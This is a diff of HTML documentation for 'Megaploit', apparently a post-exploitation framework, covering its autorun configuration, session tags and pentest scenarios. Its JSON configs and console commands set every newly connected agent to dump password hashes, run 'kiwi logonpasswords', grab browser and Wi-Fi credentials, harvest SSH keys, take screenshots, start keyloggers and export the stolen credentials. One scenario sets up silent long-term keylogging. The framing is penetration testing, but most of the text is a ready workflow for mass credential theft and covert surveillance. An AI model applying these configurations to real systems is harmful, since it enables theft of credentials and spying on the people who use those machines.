+<h3 id="preview-what-would-run-for-a-session">Preview what would run for a session<a class="headerlink" href="#preview-what-would-run-for-a-session" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>megaploit [0] » autorun test 1
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a># Shows exactly which commands would fire for session 1
+</span></code></pre></div>
 <hr />
-<h2 id="thread-safety">Thread Safety<a class="headerlink" href="#thread-safety" title="Permanent link">&para;</a></h2>
-<p><code>Pipeline._active_profiles</code> is a <code>set[str]</code> protected by <code>Pipeline._lock</code> (<code>threading.Lock</code>). All read/write operations go through <code>enable_profile</code>, <code>disable_profile</code>, <code>active_profiles</code>, and <code>commands_for</code> which all acquire the lock.</p>
+<h2 id="config-file-reference">Config File Reference<a class="headerlink" href="#config-file-reference" title="Permanent link">&para;</a></h2>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="p">{</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span><span class="nt">&quot;global&quot;</span><span class="p">:</span><span class="w">  </span><span class="p">[</span><span class="s2">&quot;sysinfo&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="p">],</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">  </span><span class="nt">&quot;windows&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;os_info&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;installed_software&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;ps&quot;</span><span class="p">],</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">  </span><span class="nt">&quot;linux&quot;</span><span class="p">:</span><span class="w">   </span><span class="p">[</span><span class="s2">&quot;os_info&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;find_suid&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;env&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;users&quot;</span><span class="p">],</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">  </span><span class="nt">&quot;macos&quot;</span><span class="p">:</span><span class="w">   </span><span class="p">[</span><span class="s2">&quot;os_info&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;env&quot;</span><span class="p">],</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">  </span><span class="nt">&quot;tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">    </span><span class="nt">&quot;dc&quot;</span><span class="p">:</span><span class="w">          </span><span class="p">[</span><span class="s2">&quot;hashdump&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;users&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;scheduled_tasks&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;net_view&quot;</span><span class="p">],</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="w">    </span><span class="nt">&quot;workstation&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;browser_creds&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;wifi_passwords&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;ps&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;keylog_start&quot;</span><span class="p">],</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="w">    </span><span class="nt">&quot;server&quot;</span><span class="p">:</span><span class="w">      </span><span class="p">[</span><span class="s2">&quot;services&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;netstat&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;users&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;os_info&quot;</span><span class="p">],</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="w">    </span><span class="nt">&quot;web&quot;</span><span class="p">:</span><span class="w">         </span><span class="p">[</span><span class="s2">&quot;ps&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;services&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;find_files /var/www config&quot;</span><span class="p">]</span>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="p">}</span>
+</span></code></pre></div>
+<h3 id="key-sections">Key sections<a class="headerlink" href="#key-sections" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Section</th>
+<th>When it runs</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>"global"</code></td>
+<td>On <strong>every</strong> new session, regardless of OS</td>
+</tr>
+<tr>
+<td><code>"windows"</code></td>
+<td>Only on Windows agents</td>
+</tr>
+<tr>
+<td><code>"linux"</code></td>
+<td>Only on Linux/Unix agents</td>
+</tr>
+<tr>
+<td><code>"macos"</code></td>
+<td>Only on macOS agents</td>
+</tr>
+<tr>
+<td><code>"tags"</code></td>
+<td>Only when the session has a matching tag</td>
+</tr>
+</tbody>
+</table>
+<h3 id="execution-order">Execution order<a class="headerlink" href="#execution-order" title="Permanent link">&para;</a></h3>
+<ol>
+<li><code>global</code> commands run first</li>
+<li>OS-specific commands run next</li>
+<li>Tag-specific commands run last</li>
+</ol>
+<hr />
+<h2 id="session-tags">Session Tags<a class="headerlink" href="#session-tags" title="Permanent link">&para;</a></h2>
+<p>Tags let you categorize sessions and trigger different autorun commands.</p>
+<h3 id="set-a-tag-on-a-session">Set a tag on a session<a class="headerlink" href="#set-a-tag-on-a-session" title="Permanent link">&para;</a></h3>
+<p>Inside the session or from global:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>megaploit session(1) » tag dc
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>megaploit session(1) » tag workstation
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>megaploit session(1) » tag web-server
+</span></code></pre></div>
+<p>Or from global context (once a session has connected):</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>megaploit [3] » sessions -s dc     # find sessions tagged dc
+</span></code></pre></div>
+<h3 id="tag-based-autorunscript-example">Tag-based AutoRunScript example<a class="headerlink" href="#tag-based-autorunscript-example" title="Permanent link">&para;</a></h3>
+<p>Config:</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">{</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span><span class="nt">&quot;global&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;sysinfo&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="p">],</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">  </span><span class="nt">&quot;tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span><span class="nt">&quot;dc&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">      </span><span class="s2">&quot;hashdump&quot;</span><span class="p">,</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">      </span><span class="s2">&quot;users&quot;</span><span class="p">,</span>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">      </span><span class="s2">&quot;net_view&quot;</span><span class="p">,</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">      </span><span class="s2">&quot;kiwi logonpasswords&quot;</span><span class="p">,</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w">      </span><span class="s2">&quot;scheduled_tasks&quot;</span>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">    </span><span class="p">],</span>
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="w">    </span><span class="nt">&quot;workstation&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="w">      </span><span class="s2">&quot;browser_creds all&quot;</span><span class="p">,</span>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="w">      </span><span class="s2">&quot;wifi_passwords&quot;</span><span class="p">,</span>
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="w">      </span><span class="s2">&quot;ps&quot;</span><span class="p">,</span>
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="w">      </span><span class="s2">&quot;screenshot&quot;</span><span class="p">,</span>
+</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="w">      </span><span class="s2">&quot;keylog_start&quot;</span>
+</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="w">    </span><span class="p">]</span>
+</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>If a session is tagged <code>dc</code>, Megaploit automatically dumps hashes, users, and domain info.
+If tagged <code>workstation</code>, it automatically grabs browser credentials and starts the keylogger.</p>
+<hr />
+<h2 id="practical-scenarios">Practical Scenarios<a class="headerlink" href="#practical-scenarios" title="Permanent link">&para;</a></h2>
+<h3 id="scenario-1-internal-network-assessment">Scenario 1 — Internal Network Assessment<a class="headerlink" href="#scenario-1-internal-network-assessment" title="Permanent link">&para;</a></h3>
+<p>You're doing an internal pentest and expect many connections from workstations and servers.
+Enable automatic recon and cred harvesting:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>megaploit [0] » pipeline enable creds
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>megaploit [0] » pipeline enable recon
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>megaploit [0] » autorun save-default
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a># Edit ~/.megaploit_autorun.json, then:
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>megaploit [0] » autorun reload
+</span></code></pre></div>
+<p>Config:</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">{</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">  </span><span class="nt">&quot;global&quot;</span><span class="p">:</span><span class="w">  </span><span class="p">[</span><span class="s2">&quot;sysinfo&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;screenshot&quot;</span><span class="p">],</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">  </span><span class="nt">&quot;windows&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;installed_software&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;startup_items&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;scheduled_tasks&quot;</span><span class="p">],</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">  </span><span class="nt">&quot;linux&quot;</span><span class="p">:</span><span class="w">   </span><span class="p">[</span><span class="s2">&quot;find_suid&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;services&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;users&quot;</span><span class="p">],</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="w">  </span><span class="nt">&quot;tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="w">    </span><span class="nt">&quot;dc&quot;</span><span class="p">:</span><span class="w">  </span><span class="p">[</span><span class="s2">&quot;hashdump&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;net_view&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;kiwi logonpasswords&quot;</span><span class="p">],</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="w">    </span><span class="nt">&quot;web&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;find_files /var/www password&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;cat /etc/nginx/nginx.conf&quot;</span><span class="p">]</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="p">}</span>
+</span></code></pre></div>
+<h3 id="scenario-2-quick-credential-sweep">Scenario 2 — Quick Credential Sweep<a class="headerlink" href="#scenario-2-quick-credential-sweep" title="Permanent link">&para;</a></h3>
+<p>If your only goal is to harvest credentials from as many machines as possible:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>megaploit [0] » pipeline enable creds
+</span></code></pre></div>
+<p>Every new agent that connects automatically runs: <code>hashdump</code>, <code>wifi_passwords</code>, <code>browser_creds</code>, <code>ssh_harvest</code>, <code>cred_vault</code>.
+All creds are saved to the SQLite store. View them later:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>megaploit [0] » creds show
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>megaploit [0] » creds export all_creds.json
+</span></code></pre></div>
+<h3 id="scenario-3-silent-long-term-monitoring">Scenario 3 — Silent Long-Term Monitoring<a class="headerlink" href="#scenario-3-silent-long-term-monitoring" title="Permanent link">&para;</a></h3>
+<p>Set up monitoring without actively touching each session:</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="p">{</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="w">  </span><span class="nt">&quot;global&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;whoami&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;screenshot&quot;</span><span class="p">],</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w">  </span><span class="nt">&quot;windows&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;keylog_start&quot;</span><span class="p">],</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="w">  </span><span class="nt">&quot;linux&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Each new session automatically takes a screenshot and starts keylogging.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>megaploit [0] » pipeline enable basic
+</span></code></pre></div>
+<hr />
+<h2 id="what-happens-when-a-session-connects">What Happens When a Session Connects<a class="headerlink" href="#what-happens-when-a-session-connects" title="Permanent link">&para;</a></h2>
+<ol>
+<li>Agent connects and authenticates (HMAC-SHA256)</li>
+<li>Session is assigned an ID and added to the session table</li>
+<li>Console shows <code>★ NEW SESSION #N ★</code> notification</li>
+<li>Background thread starts (0.5s delay for session to stabilise)</li>
+<li>Pipeline commands run in order (one at a time)</li>
+<li>AutoRunScript commands run in order (global → OS → tags)</li>
+<li>All results saved to loot and credential store</li>
+<li>Session is ready for operator interaction</li>
+</ol>
+<p>The operator is never blocked — you can interact with other sessions while pipeline runs.</p>
 
 
 
